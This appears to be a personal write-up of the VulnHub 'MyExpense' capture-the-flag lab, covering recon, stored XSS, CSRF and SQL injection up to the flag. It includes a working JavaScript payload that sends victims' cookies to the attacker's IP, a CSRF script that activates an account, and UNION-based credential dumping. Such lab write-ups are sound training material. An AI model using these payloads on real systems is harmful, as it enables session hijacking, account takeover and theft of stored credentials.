---
title: "MyExpense"
category: ["VulnHub", "MyExpense"]
---

Note title: MyExpense

To set up this machine, we need to perform some preliminary configuration since most Vulnhub OVAs are designed for VirtualBox, not VMware. So we'll change the network interface.
1. Set the machine to bridged mode.
2. When launching the machine, press 'e' to edit boot tasks. Add the following line:
![Pasted image 20251228194451](/VaultSite/wiki-images/Pasted%20image%2020251228194451.png)
3. Save and relaunch. Run `cd /etc/network` and `nano interfaces` to edit the network interface to match ours:
![Pasted image 20251228194623](/VaultSite/wiki-images/Pasted%20image%2020251228194623.png)
4. Now go to `cd /opt` and edit `login_admin_script_py`, adding our attacking machine's IP:
![Pasted image 20251228194932](/VaultSite/wiki-images/Pasted%20image%2020251228194932.png)
5. Repeat this for `login_collab1_script.py`, `login_collab2_script.py`, and `login_manager_script.py`.

Now we begin working on the machine.

---
We perform a ping to check if the machine is visible (to find its IP, we can check directly or use arpscan):
![Pasted image 20251229164318](/VaultSite/wiki-images/Pasted%20image%2020251229164318.png)
For organization, we create a directory called `myexpense`.

From the ping, we see TTL=64 → LINUX:
![Pasted image 20251229164433](/VaultSite/wiki-images/Pasted%20image%2020251229164433.png)
![Pasted image 20251229164454](/VaultSite/wiki-images/Pasted%20image%2020251229164454.png)
We perform port scanning with:
`nmap -p- --open --sS --min-rate 5000 -vvv -n -Pn 192.168.111.34`
- Explanation:
  - `-p-`: Scan all TCP ports
  - `-sS`: Stealth SYN scan
  - `--min-rate 5000`: 5000 packets/second
  - `-vvv`: Triple verbose for real-time output
  - `-n`: No DNS resolution
  - `-Pn`: Skip host discovery
![Pasted image 20251229170029](/VaultSite/wiki-images/Pasted%20image%2020251229170029.png)
Next, we scan the specific ports to identify versions and services:
`nmap -sC -sV -p80,32773,39687,53395,55153 192.168.111.34`
![Pasted image 20251229170313](/VaultSite/wiki-images/Pasted%20image%2020251229170313.png)
For more information, we could research Apache httpd 2.4.25 on Launchpad:
![Pasted image 20251229171137](/VaultSite/wiki-images/Pasted%20image%2020251229171137.png)
Let's visit the web page:
![Pasted image 20251229171257](/VaultSite/wiki-images/Pasted%20image%2020251229171257.png)
We see a login page and a tab to create an account. We try the credentials from the machine description but they don't work:
![Pasted image 20251229171344](/VaultSite/wiki-images/Pasted%20image%2020251229171344.png)
Now we perform fuzzing with GOBUSTER to find directories and files (using dictionaries like SecLists or Rockyou, with 20 threads for speed):
`gobuster dir -u http://192.168.111.32/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20`

We find an interesting directory `/admin`:
![Pasted image 20251229172013](/VaultSite/wiki-images/Pasted%20image%2020251229172013.png)
Access is denied since we're not admin. Wappalyzer shows PHP is used, so we'll brute-force PHP files in the admin directory:
![Pasted image 20251229172221](/VaultSite/wiki-images/Pasted%20image%2020251229172221.png)
Adding `-x php` to search for PHP extensions:
`gobuster dir -u http://192.168.111.32/admin/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php`
![Pasted image 20251229172450](/VaultSite/wiki-images/Pasted%20image%2020251229172450.png)
BINGO! We find a file containing:
![Pasted image 20251229172532](/VaultSite/wiki-images/Pasted%20image%2020251229172532.png)
We see user 'samuel' (from the description) with a password. Trying to login shows the account is inactive:
![Pasted image 20251229172849](/VaultSite/wiki-images/Pasted%20image%2020251229172849.png)
Attempting to create a new account fails because the signup button is disabled:
![Pasted image 20251229173005](/VaultSite/wiki-images/Pasted%20image%2020251229173005.png)
Using Ctrl+Shift+C, we inspect the HTML and remove the 'disabled' attribute:
![Pasted image 20251229173239](/VaultSite/wiki-images/Pasted%20image%2020251229173239.png)
Account is created but remains inactive:
![Pasted image 20251229173335](/VaultSite/wiki-images/Pasted%20image%2020251229173335.png)
We test for XSS by injecting JavaScript in First/Last Name fields to trigger an alert:
![Pasted image 20251229173802](/VaultSite/wiki-images/Pasted%20image%2020251229173802.png)
Checking admin.php shows the alert, confirming vulnerability:
![Pasted image 20251229173850](/VaultSite/wiki-images/Pasted%20image%2020251229173850.png)

We'll attempt cookie hijacking via XSS by having an admin visit our script. Create a new user and start an HTTP server. Inject:
`<script src="http://our_IP/pwned.js"></script>`
![Pasted image 20251229180737](/VaultSite/wiki-images/Pasted%20image%2020251229180737.png)
Create pwned.js:
```javascript
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.111.45/?cookie=' + document.cookie);
request.send();
```
![Pasted image 20251229181153](/VaultSite/wiki-images/Pasted%20image%2020251229181153.png)
![Pasted image 20251229181227](/VaultSite/wiki-images/Pasted%20image%2020251229181227.png)
In Storage, we modify the cookie:
![Pasted image 20251229181303](/VaultSite/wiki-images/Pasted%20image%2020251229181303.png)
Refreshing shows no effect due to single-use restriction:
![Pasted image 20251229181335](/VaultSite/wiki-images/Pasted%20image%2020251229181335.png)
This path is blocked. Instead, we'll leverage the logged-in user to perform actions.

In admin.php, clicking 'inactive' for samuel shows:
![Pasted image 20251229182014](/VaultSite/wiki-images/Pasted%20image%2020251229182014.png)
We see GET requests can activate accounts when properly authenticated:
![Pasted image 20251229182108](/VaultSite/wiki-images/Pasted%20image%2020251229182108.png)
We'll perform CSRF. Copy the activation URL and modify pwned.js:
```javascript
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.111.34/admin/admin.php?id=11&status=active');
request.send();
```
![Pasted image 20251229182739](/VaultSite/wiki-images/Pasted%20image%2020251229182739.png)
Restart the HTTP server:
![Pasted image 20251229182810](/VaultSite/wiki-images/Pasted%20image%2020251229182810.png)
When the request processes, samuel's account activates:
![Pasted image 20251229182857](/VaultSite/wiki-images/Pasted%20image%2020251229182857.png)
![Pasted image 20251229182910](/VaultSite/wiki-images/Pasted%20image%2020251229182910.png)
Logging in:
![Pasted image 20251229182936](/VaultSite/wiki-images/Pasted%20image%2020251229182936.png)
![Pasted image 20251229182947](/VaultSite/wiki-images/Pasted%20image%2020251229182947.png)
Inside, we see a community chat and 'expense report' tab showing the €750 transfer that failed. We'll submit it:
![Pasted image 20251229183213](/VaultSite/wiki-images/Pasted%20image%2020251229183213.png)
Checking our account shows manager Manon Riviere (from chat) must approve the budget:
![Pasted image 20251229183316](/VaultSite/wiki-images/Pasted%20image%2020251229183316.png)

We'll retry the cookie script injection in the chat (executing XSS when others view it):
```javascript
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.111.45:4646/?cookie=' + document.cookie); // Using port 4646 to avoid conflicts
request.send();
```
![Pasted image 20251229183854](/VaultSite/wiki-images/Pasted%20image%2020251229183854.png)
Start HTTP server on port 4646.

In the chat, inject:
`<script src="http://192.168.111.45:4646/pwned.js"></script>`

Note title: MyExpense

We start seeing different cookies from other users  
![Pasted image 20251229184123](/VaultSite/wiki-images/Pasted%20image%2020251229184123.png)  
Now we'll keep testing until we find the one we're interested in  
![Pasted image 20251229184210](/VaultSite/wiki-images/Pasted%20image%2020251229184210.png)  
And we've found Manon Riviere's cookie  
![Pasted image 20251229184228](/VaultSite/wiki-images/Pasted%20image%2020251229184228.png)  
We see new tabs for expense reports - let's check the report we just submitted. It's validated but not yet approved  
![Pasted image 20251229184320](/VaultSite/wiki-images/Pasted%20image%2020251229184320.png)  
If we go to Manon's user, we see that as a manager she has Paul Baudouin, who in the admin.php table has the Financial Approver role  
![Pasted image 20251229184443](/VaultSite/wiki-images/Pasted%20image%2020251229184443.png)  
Someone's in the chat but doesn't seem to be reading it  

We see another tab labeled "Rennes" with some tables that appear vulnerable to SQLi  
![Pasted image 20251229184645](/VaultSite/wiki-images/Pasted%20image%2020251229184645.png)  
Adding a single quote gives an error (likely because we're opening a quote but not closing another one behind it, or maybe they just did "where id=2" and nothing else)  
![Pasted image 20251229184726](/VaultSite/wiki-images/Pasted%20image%2020251229184726.png)  
We see that if we try to comment without the quote, no error appears  
![Pasted image 20251229184905](/VaultSite/wiki-images/Pasted%20image%2020251229184905.png)  

Let's try ordering the data with ORDER BY  
We test with 3 but get an error, while 2 works correctly  
![Pasted image 20251229185037](/VaultSite/wiki-images/Pasted%20image%2020251229185037.png)  
![Pasted image 20251229185022](/VaultSite/wiki-images/Pasted%20image%2020251229185022.png)  
We can use the error message to guess the number of columns  

We perform a UNION SELECT and see a response above the table - let's try to get the database user  
![Pasted image 20251229185204](/VaultSite/wiki-images/Pasted%20image%2020251229185204.png)  
![Pasted image 20251229185246](/VaultSite/wiki-images/Pasted%20image%2020251229185246.png)  

Now let's try listing the databases  
![Pasted image 20251229185332](/VaultSite/wiki-images/Pasted%20image%2020251229185332.png)  
The "myexpense" database catches our attention. Let's list its tables  
![Pasted image 20251229185427](/VaultSite/wiki-images/Pasted%20image%2020251229185427.png)  
We see a "user" table, so let's list its columns  
![Pasted image 20251229185502](/VaultSite/wiki-images/Pasted%20image%2020251229185502.png)  
We find user and password fields - let's dump their values  
Assuming the web app is using the myexpense database  
![Pasted image 20251229185616](/VaultSite/wiki-images/Pasted%20image%2020251229185616.png)  
![Pasted image 20251229185739](/VaultSite/wiki-images/Pasted%20image%2020251229185739.png)  

We see the credentials but they're hashed, so let's try cracking them  
![Pasted image 20251229185810](/VaultSite/wiki-images/Pasted%20image%2020251229185810.png)  
Paul's password is "HackMe"  
We log in with his account  
![Pasted image 20251229185852](/VaultSite/wiki-images/Pasted%20image%2020251229185852.png)  
When logging back in as Samuel, we can see the flag at the top  
![Pasted image 20251229185935](/VaultSite/wiki-images/Pasted%20image%2020251229185935.png)
